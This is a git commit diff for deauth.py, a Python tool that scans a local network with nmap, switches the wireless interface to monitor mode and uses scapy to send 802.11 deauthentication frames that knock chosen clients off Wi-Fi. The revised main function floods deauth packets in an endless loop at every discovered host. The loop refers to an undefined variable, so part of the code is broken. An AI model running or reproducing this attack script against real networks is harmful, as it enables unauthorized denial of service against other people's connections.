b37877d0cd57d56122c1945ced9333a11dbd237e
root <root@localhost.localdomain>
2016-12-19 01:26:32 -0500

    test client

--- deauth.py
+++ deauth.py
@@ -1,8 +1,9 @@
 import nmap
+import netifaces
 from scapy.all import *
 import StringIO
 from subprocess import check_output
-from deauth_classes_module import WirelessLocalAreaNetwork, EligibleHost
+from deauth_classes_module import EligibleHost
 
 def get_iface():
     routing_table = StringIO.StringIO(conf.route)
@@ -40,37 +41,35 @@ def get_ap_ip():
             ap_ip = split_line[2]
             return ap_ip
 
-def get_local_ip():
-    routing_table = StringIO.StringIO(conf.route)
-    for line in routing_table:
-        split_line = line.split()
-        if split_line[0] == '0.0.0.0':
-            local_ip = split_line[4]
-            return local_ip
 
-
-def get_elible_hosts(nm_scan, local_ip, ap_ip):
+def collect_eligible_hosts(nm_scan, local_ip, default_gateway):
     eligible_hosts = []
     for key, value in nm_scan['scan'].iteritems():
         if 'mac' in value['addresses']:
             mac_address = value['addresses']['mac']
         else:
             mac_address = '--:--:--:--:--:--'
-        host_name = value['hostname']
+        host_name = value['hostnames'][0]['name']
         ip_address = value['addresses']['ipv4']
-        if ip_address != local_ip and ip_address != ap_ip:
+        if ip_address != local_ip and ip_address != default_gateway:
             eh = EligibleHost(host_name, ip_address, mac_address)
             eligible_hosts.append(eh)
 
     return eligible_hosts
 
 def enable_monitor_mode(iface):
+    subprocess.call('sudo service network-manager stop', shell = True)
+    subprocess.call('sudo ifconfig ' + iface + ' down', shell=True)
+    subprocess.call('sudo iwconfig ' + iface + ' mode Monitor', shell=True)
+    subprocess.call('sudo ifconfig ' + iface + ' up', shell=True)
+
+def disable_monitor_mode(iface):
     subprocess.call('ifconfig ' + iface + ' down', shell=True)
-    subprocess.call('iwconfig ' + iface + ' mode Monitor', shell=True)
+    subprocess.call('iwconfig ' + iface + ' mode Managed', shell=True)
     subprocess.call('ifconfig ' + iface + ' up', shell=True)
 
 def ask_user():
-    user_choice = input('Who you would like to deauthenticate? ')
+    user_choice = input('Who would you like to deauthenticate? ')
     return user_choice
 
 def deauthenticate_client(user_choice, eligible_hosts, bssid):
@@ -80,9 +79,12 @@ def deauthenticate_client(user_choice, eligible_hosts, bssid):
     client_to_deauth = client_to_deauth.encode('ascii', 'ignore')
 
     packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client_to_deauth,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)
-    for n in range(2000):
-        sendp(packet)
 
+
+def display_eligible_hosts(eligible_hosts):
+    print('ID'+'\t'+'MAC'+'\t\t\t'+'IPv4'+'\t\t\t'+'HOST')
+    for i in range(0, len(eligible_hosts)):
+        print(str(i) + '\t' + eligible_hosts[i].mac_address + '\t' + eligible_hosts[i].ip_address + '\t\t' + eligible_hosts[i].host_name)
 
 
 
@@ -92,26 +94,39 @@ def deauthenticate_client(user_choice, eligible_hosts, bssid):
 
 def main():
 
-    iface = get_iface()
+    # bssid = get_bssid(iface)
+
+
+
+    # needs try / catch
+    iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
+    conf.iface = iface
+
+    local_mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
+    local_ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
+    print local_mac
+    print local_ip
 
     bssid = get_bssid(iface)
 
-    network_id = get_network_id()
     nm = nmap.PortScanner()
-    nm_scan = nm.scan(hosts = network_id, arguments='-sP')
-
-    WirelessLAN = WirelessLocalAreaNetwork(network_id, bssid, get_elible_hosts(nm_scan, get_local_ip(), get_ap_ip()))
-
-
-    # enable_monitor_mode(iface)
-
-
-    WirelessLAN.display_eligible_hosts()
-
+    nm_scan = nm.scan(hosts = '192.168.0.0/24', arguments='-sP')
+    eligible_hosts = collect_eligible_hosts(nm_scan, local_ip, '192.168.0.1')
+    display_eligible_hosts(eligible_hosts)
     user_choice = ask_user()
+    enable_monitor_mode(iface)
 
-
-    deauthenticate_client(user_choice, WirelessLAN.eligible_hosts, bssid)
+    # client_to_deauth = eligible_hosts[2].mac_address
+    while (True):
+        for e in eligible_hosts:
+            for n in range(20):
+                sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=test_client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7))
+    # WirelessLAN.display_eligible_hosts()
+    #
+    # user_choice = ask_user()
+    #
+    #
+    # deauthenticate_client(user_choice, WirelessLAN.eligible_hosts, bssid)
 
 
 if __name__ == "__main__":
